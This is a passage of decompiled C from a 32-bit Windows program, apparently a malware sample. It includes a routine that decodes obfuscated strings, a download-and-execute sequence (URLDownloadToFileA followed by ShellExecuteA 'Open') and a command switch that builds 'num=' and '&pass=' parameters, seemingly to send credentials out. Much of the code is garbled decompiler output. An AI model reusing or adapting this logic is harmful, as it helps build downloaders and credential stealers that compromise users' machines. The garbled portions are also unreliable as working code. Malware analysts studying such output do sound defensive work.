    int32_t v3 = (v2 & 0x100000) == 0 ? 0 : 255; // 0x4063fc
    int32_t v4; // 0x4063f6
    char * v5 = (char *)((v1 | (int32_t)__asm_in((int16_t)v4)) & -256 | v3); // 0x4063fd
    unsigned char v6 = *v5; // 0x4063fd
    *v5 = v6 / 128 | 2 * v6;
    uint32_t v7; // 0x4063f6
    *(char *)v4 = *(char *)&v4 + (char)(v7 / 256);
    *(int32_t *)((v2 / 0x100000 | 0x1000 * v2) - 4) = 0x4062d0;
    return EnumWindows((bool (*)(int32_t *, int32_t))&g111, (int32_t)&g111);
}

// Address range: 0x406400 - 0x406401
int32_t function_406400(int32_t a1) {
    // 0x406400
    int32_t result; // 0x406400
    return result;
}

// Address range: 0x406410 - 0x406421
int32_t function_406410(void) {
    // 0x406410
    return function_4033c4();
}

// Address range: 0x406427 - 0x4064fb
int32_t function_406427(int32_t a1, int32_t a2, int32_t a3) {
    // 0x406427
    int32_t v1; // 0x406427
    unsigned char v2 = (char)v1;
    unsigned char v3 = 2 * v2; // 0x40642a
    *(char *)v1 = v3;
    if (v3 >= v2) {
        // 0x406494
        __writefsdword(0, a3);
        return 0;
    }
    // 0x40642e
    int32_t v4; // 0x406427
    int16_t v5 = v4; // 0x40644c
    int32_t v6; // 0x406427
    __asm_outsb(v5, *(char *)(100 * *(int32_t *)(v6 + 110)));
    int32_t v7; // 0x406427
    __readfsdword(v7 + 115);
    char v8 = __asm_insb(v5); // 0x406452
    int32_t v9; // 0x406427
    char * v10 = (char *)v9; // 0x406452
    *v10 = v8;
    int64_t v11 = (int64_t)*(int32_t *)(v6 + 104 & 0xffff); // 0x406457
    int64_t v12 = 103 * v11; // 0x406457
    int32_t v13 = v12; // 0x406457
    int32_t * v14 = (int32_t *)(v13 - 4); // 0x40645c
    *v14 = 0x6b64736b;
    int32_t * v15 = (int32_t *)(v13 - 8); // 0x406461
    *v15 = 97;
    *v10 = __asm_insb(v5);
    if (v12 == 0x6700000000 * v11 / 0x100000000) {
        unsigned char v16 = *(char *)&v7; // 0x4064cc
        unsigned char v17 = v16 + v2; // 0x4064cc
        *(char *)v7 = v17;
        if (v17 < v16) {
            // 0x4064d0
            return function_406410();
        }
        // 0x4064e5
        __writefsdword(0, *v15);
        *(int32_t *)v13 = 0x406502;
        return function_403370();
    }
    // 0x406466
    *(int32_t *)(v13 - 12) = 0x666a6766;
    int32_t * v18 = (int32_t *)(v13 - 16); // 0x40646b
    *v18 = 107;
    *(int32_t *)(v13 - 20) = 97;
    *v10 = __asm_insb(v5);
    *(int32_t *)(v13 - 24) = 97;
    int32_t v19 = v13 + 4; // 0x40647c
    int32_t * v20 = (int32_t *)v19; // 0x40647c
    int32_t v21 = *v20; // 0x40647c
    *(char *)97 = __asm_insb((int16_t)*v14);
    char * v22 = (char *)v21; // 0x406482
    *v22 = *v22 + (char)v21;
    *v20 = *v18;
    *(int32_t *)v13 = v19;
    *v14 = 0x4064a9;
    *v15 = __readfsdword(0);
    return 0;
}

// Address range: 0x4064fb - 0x406500
int32_t function_4064fb(void) {
    // 0x4064fb
    return function_402d84((int32_t)&g111, (int32_t)&g111);
}

// Address range: 0x406500 - 0x406502
int32_t function_406500(void) {
    // 0x406500
    int32_t result; // 0x406500
    return result;
}

// Address range: 0x406502 - 0x406505
int32_t function_406502(int32_t a1, int32_t a2) {
    // 0x406502
    int32_t result; // 0x406502
    return result;
}

// Address range: 0x406508 - 0x406540
int32_t function_406508(void) {
    // 0x406508
    function_40657c();
    if (g34 == 0) {
        // 0x40653c
        return 0;
    }
    int32_t result = *(int32_t *)0x409154; // 0x40651a
    if (*(int32_t *)result == 0) {
        // 0x40653c
        return result;
    }
    // 0x406524
    PostQuitMessage(66);
    function_4043d4(66);
    // UNREACHABLE
}

// Address range: 0x40654c - 0x40657a
int32_t function_40654c(void) {
    // 0x40654c
    if (g28 != 0) {
        // 0x406555
        function_40657c();
    }
    int32_t v1 = *(int32_t *)*(int32_t *)0x409148; // 0x406564
    int32_t timerId = SetTimer((int32_t *)0x406508, 1000 * v1, 0, NULL); // 0x40656f
    g28 = timerId;
    return timerId;
}

// Address range: 0x40657c - 0x40659a
int32_t function_40657c(void) {
    // 0x40657c
    int32_t result; // 0x40657c
    if (g28 != 0) {
        // 0x406585
        KillTimer((int32_t *)g28, 0);
        g28 = 0;
        result = 0;
    }
    // 0x406599
    return result;
}

// Address range: 0x40659c - 0x4065a8
int32_t function_40659c(void) {
    // 0x40659c
    int32_t v1; // 0x40659c
    return function_406400(v1);
}

// Address range: 0x4065a8 - 0x4065cf
int32_t function_4065a8(void) {
    // 0x4065a8
    if (g29 != 0) {
        // 0x4065b1
        function_4065d0();
    }
    int32_t timerId = SetTimer((int32_t *)0x40659c, 0x1492, 0, NULL); // 0x4065c4
    g29 = timerId;
    return timerId;
}

// Address range: 0x4065d0 - 0x4065ee
int32_t function_4065d0(void) {
    // 0x4065d0
    int32_t result; // 0x4065d0
    if (g29 != 0) {
        // 0x4065d9
        KillTimer((int32_t *)g29, 0);
        g29 = 0;
        result = 0;
    }
    // 0x4065ed
    return result;
}

// Address range: 0x4065f0 - 0x406601
int32_t function_4065f0(void) {
    // 0x4065f0
    return function_4033c4();
}

// Address range: 0x406607 - 0x4066db
int32_t function_406607(int32_t a1, int32_t a2, int32_t a3) {
    // 0x406607
    int32_t v1; // 0x406607
    unsigned char v2 = (char)v1;
    unsigned char v3 = 2 * v2; // 0x40660a
    *(char *)v1 = v3;
    if (v3 >= v2) {
        // 0x406674
        __writefsdword(0, a3);
        return 0;
    }
    // 0x40660e
    int32_t v4; // 0x406607
    int16_t v5 = v4; // 0x40662c
    int32_t v6; // 0x406607
    __asm_outsb(v5, *(char *)(100 * *(int32_t *)(v6 + 110)));
    int32_t v7; // 0x406607
    __readfsdword(v7 + 115);
    char v8 = __asm_insb(v5); // 0x406632
    int32_t v9; // 0x406607
    char * v10 = (char *)v9; // 0x406632
    *v10 = v8;
    int64_t v11 = (int64_t)*(int32_t *)(v6 + 104 & 0xffff); // 0x406637
    int64_t v12 = 103 * v11; // 0x406637
    int32_t v13 = v12; // 0x406637
    int32_t * v14 = (int32_t *)(v13 - 4); // 0x40663c
    *v14 = 0x6b64736b;
    int32_t * v15 = (int32_t *)(v13 - 8); // 0x406641
    *v15 = 97;
    *v10 = __asm_insb(v5);
    if (v12 == 0x6700000000 * v11 / 0x100000000) {
        unsigned char v16 = *(char *)&v7; // 0x4066ac
        unsigned char v17 = v16 + v2; // 0x4066ac
        *(char *)v7 = v17;
        if (v17 < v16) {
            // 0x4066b0
            return function_4065f0();
        }
        // 0x4066c5
        __writefsdword(0, *v15);
        *(int32_t *)v13 = 0x4066e2;
        return function_403370();
    }
    // 0x406646
    *(int32_t *)(v13 - 12) = 0x666a6766;
    int32_t * v18 = (int32_t *)(v13 - 16); // 0x40664b
    *v18 = 107;
    *(int32_t *)(v13 - 20) = 97;
    *v10 = __asm_insb(v5);
    *(int32_t *)(v13 - 24) = 97;
    int32_t v19 = v13 + 4; // 0x40665c
    int32_t * v20 = (int32_t *)v19; // 0x40665c
    int32_t v21 = *v20; // 0x40665c
    *(char *)97 = __asm_insb((int16_t)*v14);
    char * v22 = (char *)v21; // 0x406662
    *v22 = *v22 + (char)v21;
    *v20 = *v18;
    *(int32_t *)v13 = v19;
    *v14 = 0x406689;
    *v15 = __readfsdword(0);
    return 0;
}

// Address range: 0x4066db - 0x4066e0
int32_t function_4066db(void) {
    // 0x4066db
    return function_402d84((int32_t)&g111, (int32_t)&g111);
}

// Address range: 0x4066e0 - 0x4066e2
int32_t function_4066e0(void) {
    // 0x4066e0
    int32_t result; // 0x4066e0
    return result;
}

// Address range: 0x4066e2 - 0x4066e5
int32_t function_4066e2(int32_t a1, int32_t a2) {
    // 0x4066e2
    int32_t result; // 0x4066e2
    return result;
}

// Address range: 0x4066e8 - 0x4066ee
int32_t function_4066e8(void) {
    // 0x4066e8
    return URLDownloadToFileA2();
}

// Address range: 0x4066f0 - 0x40677c
int32_t function_4066f0(void) {
    // 0x4066f0
    function_4036b8();
    int32_t v1 = __readfsdword(0); // bp-32, 0x40670c
    __writefsdword(0, (int32_t)&v1);
    function_4034c8();
    function_403854();
    int32_t v2 = function_4034c8(); // 0x406726
    int32_t v3 = 1; // 0x40672f
    int32_t v4 = v2; // 0x40672f
    if (v2 < 1) {
        // 0x406766
        __writefsdword(0, v1);
        return function_403370();
    }
    int32_t v5 = v3 - 1;
    int32_t v6; // 0x4066f0
    char * v7 = (char *)(v5 + v6); // 0x406739
    int32_t v8 = function_403720();
    if (*v7 != 61) {
        // 0x40674e
        *(char *)(v8 + v5) = *v7 - 1;
    } else {
        // 0x406740
        *(char *)(v8 + v5) = 46;
    }
    // 0x406762
    v4--;
    v3++;
    while (v4 != 0) {
        // 0x406736
        v5 = v3 - 1;
        v7 = (char *)(v5 + v6);
        v8 = function_403720();
        if (*v7 != 61) {
            // 0x40674e
            *(char *)(v8 + v5) = *v7 - 1;
        } else {
            // 0x406740
            *(char *)(v8 + v5) = 46;
        }
        // 0x406762
        v4--;
        v3++;
    }
    // 0x406766
    __writefsdword(0, v1);
    return function_403370();
}

// Address range: 0x40677c - 0x406781
int32_t function_40677c(void) {
    // 0x40677c
    return function_402d84((int32_t)&g111, (int32_t)&g111);
}

// Address range: 0x406781 - 0x406783
int32_t function_406781(void) {
    // 0x406781
    int32_t result; // 0x406781
    return result;
}

// Address range: 0x406783 - 0x406789
int32_t function_406783(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    // 0x406783
    int32_t result; // 0x406783
    return result;
}

// Address range: 0x40678c - 0x4067c2
int32_t function_40678c(void) {
    // 0x40678c
    int32_t v1; // 0x40678c
    int32_t v2; // 0x40678c
    function_4027a0(v2, v1);
    function_402694();
    return function_4034a4();
}

// Address range: 0x4067c4 - 0x40690b
int32_t function_4067c4(void) {
    // 0x4067c4
    int32_t v1; // bp-4, 0x4067c4
    int32_t v2 = &v1; // 0x4067c4
    int32_t v3 = v2; // 0x4067c7
    int32_t v4; // 0x4067c4
    for (int32_t i = 5; i > 0; i--) {
        // 0x4067cc
        v4 = v3;
        *(int32_t *)(v4 - 4) = 0;
        v3 = v4 - 8;
        *(int32_t *)v3 = 0;
    }
    // 0x4067d3
    *(int32_t *)(v4 - 12) = 0;
    *(int32_t *)(v4 - 20) = v2;
    *(int32_t *)(v4 - 24) = 0x40690b;
    int32_t v5 = __readfsdword(0); // 0x4067dd
    int32_t v6 = v4 - 28; // 0x4067dd
    *(int32_t *)v6 = v5;
    __writefsdword(0, v6);
    function_403474();
    function_4066f0();
    function_4036c8();
    function_403474();
    int32_t v7; // bp-12, 0x4067c4
    *(int32_t *)(v4 - 32) = (int32_t)&v7;
    function_403728(&g111);
    function_403768();
    int32_t v8; // bp-16, 0x4067c4
    *(int32_t *)(v4 - 36) = (int32_t)&v8;
    function_4034c8();
    function_403728(&g111);
    *(int32_t *)(v4 - 40) = (int32_t)"Down(";
    function_40678c();
    *(int32_t *)(v4 - 48) = (int32_t)&g4;
    *(int32_t *)(v4 - 52) = v8;
    function_403588((int32_t)&g111);
    *(int32_t *)(v4 - 56) = 0;
    *(int32_t *)(v4 - 60) = 0;
    function_403514();
    *(int32_t *)(v4 - 64) = function_4036c8();
    function_403474();
    function_4066f0();
    *(int32_t *)(v4 - 68) = function_4036c8();
    *(int32_t *)(v4 - 72) = 0;
    function_4066e8();
    *(int32_t *)(v4 - 76) = 1;
    *(int32_t *)(v4 - 80) = 0;
    *(int32_t *)(v4 - 84) = 0;
    function_403514();
    int32_t v9 = function_4036c8(); // 0x4068de
    int32_t * v10 = (int32_t *)(v4 - 88); // 0x4068e3
    *v10 = v9;
    *(int32_t *)(v4 - 92) = (int32_t)"Open";
    int32_t * v11 = (int32_t *)(v4 - 96); // 0x4068e9
    *v11 = 0;
    ShellExecuteA(&g111, (char *)&g111, (char *)&g111, (char *)&g111, (char *)&g111, (int32_t)&g111);
    __writefsdword(0, *v11);
    *v10 = 0x406912;
    return function_403394();
}

// Address range: 0x40690b - 0x406910
int32_t function_40690b(void) {
    // 0x40690b
    return function_402d84((int32_t)&g111, (int32_t)&g111);
}

// Address range: 0x406910 - 0x406912
int32_t function_406910(void) {
    // 0x406910
    int32_t result; // 0x406910
    return result;
}

// Address range: 0x406912 - 0x406917
int32_t function_406912(int32_t a1) {
    // 0x406912
    int32_t result; // 0x406912
    return result;
}

// Address range: 0x406937 - 0x406bec
int32_t function_406937(int32_t a1, int32_t a2) {
    int32_t v1 = a2;
    int32_t v2; // 0x406937
    *(int32_t *)v2 = v2 + 1;
    int32_t v3; // 0x406937
    int32_t v4 = v3;
    *(char *)v4 = *(char *)&v3 + (char)v4;
    char * v5 = (char *)(v2 + 58); // 0x40693b
    *v5 = *v5 + (char)(v3 / 256);
    int32_t v6; // 0x406937
    char * v7 = (char *)(v6 + 112); // 0x40693f
    int32_t v8; // 0x406937
    *v7 = *v7 + (char)v8;
    int32_t v9; // 0x406937
    int32_t v10; // 0x406937
    __asm_outsb((int16_t)v10, __readgsbyte(v9));
    int32_t v11 = v3;
    *(char *)v11 = *(char *)&v3 + (char)v11;
    int32_t v12 = v3;
    *(char *)v12 = *(char *)&v3 + (char)v12;
    int32_t v13 = &v1; // 0x406948
    int32_t v14 = v13; // 0x40694b
    int32_t v15; // 0x406937
    for (int32_t i = 13; i > 0; i--) {
        // 0x406950
        v15 = v14;
        *(int32_t *)(v15 - 4) = 0;
        v14 = v15 - 8;
        *(int32_t *)v14 = 0;
    }
    // 0x406957
    *(int32_t *)(v15 - 12) = 0;
    *(int32_t *)(v15 - 20) = v13;
    *(int32_t *)(v15 - 24) = 0x406bec;
    int32_t v16 = __readfsdword(0); // 0x406961
    int32_t v17 = v15 - 28; // 0x406961
    *(int32_t *)v17 = v16;
    __writefsdword(0, v17);
    function_40380c();
    int32_t v18; // bp-4, 0x406937
    *(int32_t *)(v15 - 32) = (int32_t)&v18;
    function_403728(&g111);
    int32_t v19 = v15 - 36; // 0x406992
    int32_t * v20 = (int32_t *)v19;
    int32_t v21; // bp-8, 0x406937
    *v20 = (int32_t)&v21;
    function_4034c8();
    function_403728(&g111);
    v3 = a1 - 1;
    int32_t * v22 = v20; // 0x406937
    int32_t v23 = v19; // 0x406937
    switch (a1) {
        case 0: {
            // 0x4069c9
            v22 = v20;
            v23 = v19;
            if (function_4034c8() >= 5) {
                // 0x4069da
                function_403474();
                function_4066f0();
                function_403474();
                function_4066f0();
                *(int32_t *)(v15 - 48) = v18;
                *(int32_t *)(v15 - 52) = (int32_t)&g5;
                *(int32_t *)(v15 - 56) = v21;
                function_403588((int32_t)&g111);
                *(int32_t *)(v15 - 64) = 0x406c1c;
                *(int32_t *)(v15 - 68) = v18;
                *(int32_t *)(v15 - 72) = 0x406c2c;
                *(int32_t *)(v15 - 76) = v21;
                *(int32_t *)(v15 - 80) = 0x406c3c;
                function_407b54();
                function_403588((int32_t)&g111);
                int32_t v24 = v15 - 92; // 0x406a68
                int32_t * v25 = (int32_t *)v24;
                int32_t v26; // bp-40, 0x406937
                *v25 = (int32_t)&v26;
                function_403474();
                function_4066f0();
                int32_t v27 = function_40380c(); // 0x406a8c
                int32_t * v28 = (int32_t *)(v15 - 96); // 0x406a92
                *v28 = v27 - 1;
                function_403474();
                function_4066f0();
                function_403728(&g111);
                *v28 = v26;
                function_403474();
                function_4066f0();
                function_403474();
                function_4066f0();
                function_405ad0((int32_t)&g111, (int32_t)&g111, (int32_t)&g111, (int32_t)&g111);
                v22 = v25;
                v23 = v24;
            }
            // break -> 0x406bd1
            break;
        }
        case 1: {
            // 0x406b09
            v22 = v20;
            v23 = v19;
            if (function_4034c8() >= 5) {
                // 0x406b1a
                *(int32_t *)(v15 - 40) = (int32_t)"num=";
                function_404ca0();
                *(int32_t *)(v15 - 48) = (int32_t)"&pass=";
                function_404ca0();
                int32_t v29 = v15 - 52; // 0x406b3d
                function_403588((int32_t)&g111);
                function_403474();
                function_4066f0();
                function_404df8();
                v22 = (int32_t *)v29;
                v23 = v29;
            }
            // break -> 0x406bd1
            break;
        }
        case 2: {
            // 0x406b77
            v22 = v20;
            v23 = v19;
            if (function_4034c8() >= 5) {
                // 0x406b84
                *(int32_t *)(v15 - 40) = (int32_t)"num=";
                function_404ca0();
                *(int32_t *)(v15 - 48) = (int32_t)"&pass=";
                function_404ca0();
                int32_t v30 = v15 - 52; // 0x406ba7
                function_403588((int32_t)&g111);
                function_4066f0();
                function_404df8();
                v22 = (int32_t *)v30;
                v23 = v30;
            }
            // break -> 0x406bd1
            break;
        }
    }
    // 0x406bd1
    __writefsdword(0, *v22);
    *(int32_t *)(v23 + 8) = 0x406bf3;
    return function_403394();
}

// Address range: 0x406bec - 0x406bf1
int32_t function_406bec(void) {
    // 0x406bec
    return function_402d84((int32_t)&g111, (int32_t)&g111);
}

// Address range: 0x406bf1 - 0x406bf3
int32_t function_406bf1(void) {
    // 0x406bf1
    int32_t result; // 0x406bf1
    return result;
}

// Address range: 0x406bf3 - 0x406bfa
int32_t function_406bf3(int32_t a1) {
    // 0x406bf3
    int32_t result; // 0x406bf3
    return result;
}

// Address range: 0x406c1f - 0x406c22
int32_t function_406c1f(void) {
    // 0x406c1f
    int32_t result; // 0x406c1f
    return result;
}

// Address range: 0x406c27 - 0x406c2e
int32_t function_406c27(void) {
    // 0x406c27
    int32_t v1; // 0x406c27
    *(int32_t *)v1 = v1 + 1;
    int32_t result; // 0x406c27
    int32_t v2 = result;
    *(char *)v2 = *(char *)&result + (char)v2;
    uint32_t v3 = result;
    *(char *)v3 = *(char *)&result + (char)(v3 / 256);
    return result;
}

// Address range: 0x406c2e - 0x406c32
int32_t function_406c2e(void) {
    // 0x406c2e
    return function_406c6c();
}

// Address range: 0x406c6a - 0x406c6c
int32_t function_406c6a(void) {
    // 0x406c6a
    int32_t result; // 0x406c6a
    *(char *)result = 2 * (char)result;
    return result;
}

// Address range: 0x406c6c - 0x406d19
int32_t function_406c6c(void) {
    // 0x406c6c
    bool v1; // 0x406c6c
    if (v1) {
        // 0x406cd0
        function_4045ac();
    } else {
        bool v2; // 0x406c6c
        if (v2) {
            // 0x406c71
            int32_t result; // 0x406c6c
            return result;
        }
    }
    // 0x406ce4
    CreateThread(NULL, (int32_t)&g111, (int32_t (*)(int32_t *))&g111, &g111, (int32_t)&g111, &g111);
    int32_t v3; // 0x406c6c
    int32_t lpThreadAttributes = v3 + 20; // 0x406ceb
    CreateThread((struct _SECURITY_ATTRIBUTES *)lpThreadAttributes, 0, NULL, (int32_t *)0x406948, 0, NULL);
    int32_t Msg = *(int32_t *)(v3 + 16); // 0x406d05
    int32_t lParam = *(int32_t *)(v3 + 8); // 0x406d0a
    int32_t wParam; // 0x406c6c
    return DefWindowProcA((int32_t *)*(int32_t *)lpThreadAttributes, Msg, wParam, lParam);
}

// Address range: 0x406d1c - 0x406d51
int32_t function_406d1c(void) {
    // 0x406d1c
    return SetWindowLongA((int32_t *)0x406ca0, -4, function_4045bc(0, 0, 0, 0, 0, 0, 0, (int32_t)g83, 0));
}

// Address range: 0x406d51 - 0x406e71
int32_t function_406d51(int32_t a1, uint32_t a2, int32_t a3, int32_t a4, int32_t lpClassName, int32_t a6, int32_t a7) {
    // 0x406d51
    int32_t v1; // 0x406d51
    unsigned char v2 = (char)v1;
    *(char *)v1 = 2 * v2;
    char * v3 = (char *)(v1 + 114); // 0x406d53
    uint32_t v4; // 0x406d51
    char v5 = v4 / 256; // 0x406d53
    *v3 = *v3 + v5;
    unsigned char v6 = v2 - 32; // 0x406d56
    int32_t result = v1 & -256 | (int32_t)v6; // 0x406d56
    if (v2 >= 32 && v6 != 0) {
        // 0x406dc9
        return result;
    }
    char * v7 = (char *)(result + 105); // 0x406d5a
    *v7 = *v7 & v5;
    int16_t v8 = a3; // 0x406d5e
    char * v9 = (char *)a6; // 0x406d5e
    __asm_outsb(v8, *v9);
    char * v10 = (char *)(lpClassName + 105 & 0xffff); // 0x406d5f
    uint32_t v11 = a2 / 256; // 0x406d5f
    *v10 = *v10 & (char)v11;
    char * v12 = (char *)(a2 + 115 + 2 * lpClassName); // 0x406d63
    char v13 = *v12 + (char)a2; // 0x406d63
    *v12 = v13;
    if (v13 == 0) {
        // 0x406dab
        __asm_outsb(v8, *v9);
        int32_t v14 = a1 + 1; // 0x406dac
        return v11 + v14 & 255 | v14 & -256;
    }
    // 0x406d69
    __asm_outsd(v8, *(int32_t *)a6);
    int32_t * v15 = FindWindowA((char *)lpClassName, (char *)&g111); // 0x406d80
    if (v15 != NULL) {
        // 0x406dc9
        return (int32_t)v15;
    }
    // 0x406d8d
    function_406d1c();
    return (int32_t)LoadLibraryA((char *)function_4036c8());
}

// Address range: 0x406e71 - 0x406f97
int32_t function_406e71(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, uint32_t result, uint32_t a9, int32_t a10, int32_t a11, int32_t a12, int32_t a13, int32_t a14) {
    int32_t v1 = a7;
    uint32_t v2; // 0x406e71
    unsigned char v3 = (char)v2;
    *(char *)v2 = 2 * v3;
    char * v4 = (char *)(v2 + 114); // 0x406e73
    uint32_t v5; // 0x406e71
    char v6 = v5 / 256; // 0x406e73
    *v4 = *v4 + v6;
    unsigned char v7 = v3 - 32; // 0x406e76
    int32_t result2 = v2 & -256 | (int32_t)v7; // 0x406e76
    int32_t v8; // 0x406e71
    if (v3 < 32 || v7 == 0) {
        char * v9 = (char *)(result2 + 105); // 0x406e7a
        *v9 = *v9 & v6;
        int16_t v10 = a10; // 0x406e7e
        __asm_outsb(v10, *(char *)a13);
        char * v11 = (char *)(a12 + 105 & 0xffff); // 0x406e7f
        char v12 = a9 / 256; // 0x406e7f
        *v11 = *v11 & v12;
        int32_t v13 = a9 + 115; // 0x406e83
        char * v14 = (char *)(2 * a12 + v13); // 0x406e83
        unsigned char v15 = *v14; // 0x406e83
        char v16 = v15 + (char)a9; // 0x406e83
        *v14 = v16;
        if (v16 == 0) {
            int16_t v17 = *(int16_t *)(a11 + 110); // 0x406ecb
            __asm_outsb(v10, *(char *)(100 * (int32_t)v17 & 0xfffc | a13 & -0x10000));
            __readfsdword(v13);
            *(char *)a14 = __asm_insb(v10);
            return result;
        }
        // 0x406e89
        __asm_outsd(v10, *(int32_t *)a13);
        int32_t v18; // 0x406e71
        if (v16 < 0) {
            // 0x406f01
            int32_t v19; // bp+64, 0x406e71
            int32_t v20 = &v19;
            v18 = v20;
            if (v16 < v15) {
                // 0x406f03
                *(char *)v1 = __asm_insb((int16_t)a3);
                *(int32_t *)(v20 - 4) = 97;
                int32_t v21 = v20 + 24; // 0x406f0c
                int32_t * v22 = (int32_t *)(v20 + 16); // 0x406f0c
                int32_t * v23 = (int32_t *)v21; // 0x406f0c
                int32_t v24 = *v23; // 0x406f0c
                *(char *)97 = __asm_insb((int16_t)*v22);
                char * v25 = (char *)v24; // 0x406f12
                *v25 = *v25 + (char)v24;
                *v23 = *(int32_t *)(v20 + 4);
                int32_t * v26 = (int32_t *)(v20 + 20); // 0x406f19
                *v26 = v21;
                *v22 = 0x406f45;
                int32_t v27 = __readfsdword(0); // 0x406f1f
                int32_t v28 = v20 + 12; // 0x406f1f
                int32_t * v29 = (int32_t *)v28; // 0x406f1f
                *v29 = v27;
                __writefsdword(0, v28);
                int32_t v30 = g103 + 1; // 0x406f25
                g103 = v30;
                if (v30 == 0) {
                    // 0x406f2d
                    function_403370();
                }
                // 0x406f37
                __writefsdword(0, *v29);
                *v26 = 0x406f4c;
                return 0;
            }
        } else {
            unsigned char v31 = (char)result; // 0x406e8e
            unsigned char v32 = v31 - 32; // 0x406e8e
            if (v31 < 32 || v32 == 0) {
                char * v33 = (char *)(a9 + 105); // 0x406e92
                *v33 = *v33 & (char)(result / 256);
                char * v34 = (char *)(a13 + 105); // 0x406e95
                *v34 = *v34 & v12;
                char * v35 = (char *)(result & -256 | (int32_t)v32); // 0x406e98
                *v35 = *v35 + 2 * v32;
                int32_t * v36 = (int32_t *)a9; // 0x406e9c
                *v36 = *v36 + a13;
                *v35 = *v35 + v32;
                return function_4033c4();
            }
            // 0x406f01
            v18 = &v1;
        }
        // 0x406f6e
        function_4033c4();
        v8 = v18;
    } else {
        int32_t v37 = 0x736b6867; // bp-4, 0x406ee9
        int32_t v38; // 0x406e71
        int64_t v39 = __readfsdword(v38 + 97); // 0x406eef
        if (108 * v39 != 0x6c00000000 * v39 / 0x100000000) {
            // 0x406ef6
            return result2;
        }
        int32_t v40 = &v37; // 0x406ee9
        int32_t v41; // 0x406e71
        char * v42 = (char *)(v41 + 48 + 8 * v41); // 0x406f5c
        *v42 = *v42 + (char)(v2 / 256);
        __writefsdword(result2, v40);
        int32_t v43 = g103; // 0x406f63
        g103 = v43 - 1;
        v8 = v40;
        if (v43 == 0) {
            // 0x406ef6
            return result2;
        }
    }
    // 0x406f81
    __writefsdword(0, *(int32_t *)v8);
    *(int32_t *)(v8 + 8) = 0x406f9e;
    return function_403370();
}

// Address range: 0x406f97 - 0x406f9c
int32_t function_406f97(void) {
    // 0x406f97
    return function_402d84((int32_t)&g111, (int32_t)&g111);
}

// Address range: 0x406f9c - 0x406f9e
int32_t function_406f9c(void) {
    // 0x406f9c
    int32_t result; // 0x406f9c
    return result;
}

// Address range: 0x406f9e - 0x406fa1
int32_t function_406f9e(int32_t a1, int32_t a2) {
    // 0x406f9e
    int32_t result; // 0x406f9e
    return result;
}

// Address range: 0x406fdf - 0x406fe6
int32_t function_406fdf(void) {
    // 0x406fdf
    int32_t result; // 0x406fdf
    return result;
}

// Address range: 0x406fec - 0x4071a6
int32_t function_406fec(void) {
    int32_t v1 = __readfsdword(0); // bp-56, 0x40700b
    __writefsdword(0, (int32_t)&v1);
    function_403514();
    char * lpFileName = (char *)function_4036c8(); // 0x407045
    char * v2 = lpFileName; // bp-84, 0x407045
    int32_t * fileHandle = CreateFileA(lpFileName, (int32_t)&g111, (int32_t)&g111, (struct _SECURITY_ATTRIBUTES *)&g111, (int32_t)&g111, (int32_t)&g111, &g111); // 0x407046
    int32_t v3 = (int32_t)&v2; // 0x407050
    if (fileHandle != (int32_t *)-1) {
        int32_t v4 = (int32_t)fileHandle; // 0x407046
        int32_t v5 = v4; // bp-92, 0x407058
        int32_t v6 = GetFileSize(NULL, fileHandle); // 0x407059
        v3 = &v5;
        if (v6 >= 1) {
            // 0x407072
            function_403854();
            int32_t hFile = function_403720(); // 0x407085
            ReadFile((int32_t *)hFile, fileHandle, (int32_t)&g111, &g111, (struct _OVERLAPPED *)&g111);
            int32_t v7 = v4; // bp-116, 0x407091
            CloseHandle(fileHandle);
            function_4046d4();
            v3 = &v7;
        }
    }
    // 0x40718b
    __writefsdword(0, *(int32_t *)v3);
    *(int32_t *)(v3 + 8) = 0x4071ad;
    return function_403394();
}

// Address range: 0x4071a6 - 0x4071ab
int32_t function_4071a6(void) {
    // 0x4071a6
    return function_402d84((int32_t)&g111, (int32_t)&g111);
}

// Address range: 0x4071ab - 0x4071ad
int32_t function_4071ab(void) {
    // 0x4071ab
    int32_t result; // 0x4071ab
    return result;
}

// Address range: 0x4071ad - 0x4071b7
int32_t function_4071ad(int32_t a1, int32_t a2, int32_t a3) {
    // 0x4071ad
    int32_t v1; // 0x4071ad
    return *(int32_t *)(v1 - 4);
}

// Address range: 0x4071e4 - 0x4072e8
int32_t function_4071e4(void) {
    int32_t v1 = 0; // bp-8, 0x4071e7
    int32_t v2 = __readfsdword(0); // bp-40, 0x4071f8
    int32_t v3 = &v2; // 0x4071f8
    __writefsdword(0, v3);
    int32_t v4 = v3; // 0x40720c
    if (function_403c88() >= 1) {
        // 0x407212
        function_403514();
        char * lpFileName = (char *)function_4036c8(); // 0x407241
        char * v5 = lpFileName; // bp-68, 0x407241
        int32_t v6 = (int32_t)&v5; // 0x407241
        int32_t * fileHandle = CreateFileA(lpFileName, (int32_t)&g111, (int32_t)&g111, (struct _SECURITY_ATTRIBUTES *)&g111, (int32_t)&g111, (int32_t)&g111, &g111); // 0x407242
        v4 = v6;
        if (fileHandle != (int32_t *)-1) {
            // 0x40724e
            function_403370();
            uint32_t v7 = function_403c90(); // 0x40725b
            int32_t v8 = v6; // 0x407264
            if (v7 >= 0) {
                int32_t v9 = 0; // 0x407267
                int32_t v10 = v6; // 0x407267
                int32_t v11 = v7 + 1; // 0x407267
                *(int32_t *)(v10 - 4) = 0;
                int32_t v12 = 8 * v9; // 0x407271
                *(int32_t *)(v10 - 8) = *(int32_t *)(g105 + v12);
                *(int32_t *)(v10 - 12) = (int32_t)&g6;
                *(int32_t *)(v10 - 16) = *(int32_t *)(g105 + (v12 | 4));
                v10 -= 20;
                *(int32_t *)v10 = (int32_t)"\r\n";
                function_403588((int32_t)&g111);
                v11--;
                v9++;
                v8 = v10;
                while (v11 != 0) {
                    // 0x407269
                    *(int32_t *)(v10 - 4) = 0;
                    v12 = 8 * v9;
                    *(int32_t *)(v10 - 8) = *(int32_t *)(g105 + v12);
                    *(int32_t *)(v10 - 12) = (int32_t)&g6;
                    *(int32_t *)(v10 - 16) = *(int32_t *)(g105 + (v12 | 4));
                    v10 -= 20;
                    *(int32_t *)v10 = (int32_t)"\r\n";
                    function_403588((int32_t)&g111);
                    v11--;
                    v9++;
                    v8 = v10;
                }
            }
            int32_t v13 = (int32_t)fileHandle; // 0x407242
            function_4046d4();
            *(int32_t *)(v8 - 4) = 0;
            *(int32_t *)(v8 - 8) = (int32_t)&v1;
            *(int32_t *)(v8 - 12) = function_4034c8();
            *(int32_t *)(v8 - 16) = function_403720();
            *(int32_t *)(v8 - 20) = v13;
            function_40446c();
            *(int32_t *)(v8 - 24) = v13;
